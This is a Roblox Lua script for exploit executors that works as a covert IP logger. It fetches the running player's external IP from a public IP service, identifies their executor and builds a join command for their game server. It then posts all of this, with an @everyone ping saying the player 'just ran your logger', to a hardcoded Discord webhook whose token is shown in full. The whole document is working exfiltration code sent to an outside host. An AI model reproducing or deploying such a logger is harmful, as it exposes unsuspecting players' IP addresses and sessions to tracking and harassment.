-- Generates the join script
local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
print(join_script) -- Fixed typo, now prints the actual join script

-- Check executor
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or 
   pebc_execute and "ProtoSmasher" or 
   syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or 
   SONA_LOADED and "Sona" or 
   "Kid with shit exploit"

-- Fetch the external IP (this will send a request to an external API to fetch the IP)
local external_ip = game:GetService("HttpService"):GetAsync("http://api.ipify.org?format=json")
local parsed_ip = game:GetService("HttpService"):JSONDecode(external_ip).ip

-- Webhook URL
local url = "https://discord.com/api/webhooks/1346273624356552795/n7ZgeTc-2NVhkFRM5XU6yn40UIcvNiWb6UO5K30pYSgeOQUn6N4joHtZhYi4QvYPpUs9"

local data = {
    ["username"] = "Cooked", -- Webhook name
    ["avatar_url"] = "https://[Log in to view URL]", -- Avatar image URL
    
    ["content"] = " @everyone **" .. game.Players.LocalPlayer.Name .. "** just ran your logger", -- Normal message
    ["embeds"] = {
        {
            ["title"] = "** " .. game.Players.LocalPlayer.Name .. " just ran your logger**",
            ["description"] = "**Username: " .. game.Players.LocalPlayer.Name .. "\nExternal IP: " .. parsed_ip .. "\nUses: " .. webhookcheck .. "**",
            ["type"] = "rich",  -- Embed type
            ["color"] = 14680319,  -- Color of the embed
            ["footer"] = {
                ["text"] = "" .. join_script .. "",  -- Sends the join script
            },
        },
    }
}

-- Encoding the data to JSON format
local newdata = game:GetService("HttpService"):JSONEncode(data)

-- Headers for the HTTP request
local headers = {
    ["content-type"] = "application/json"
}

-- Select the correct request function based on the executor
request = http_request or request or HttpPost or syn.request

-- Sending the POST request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
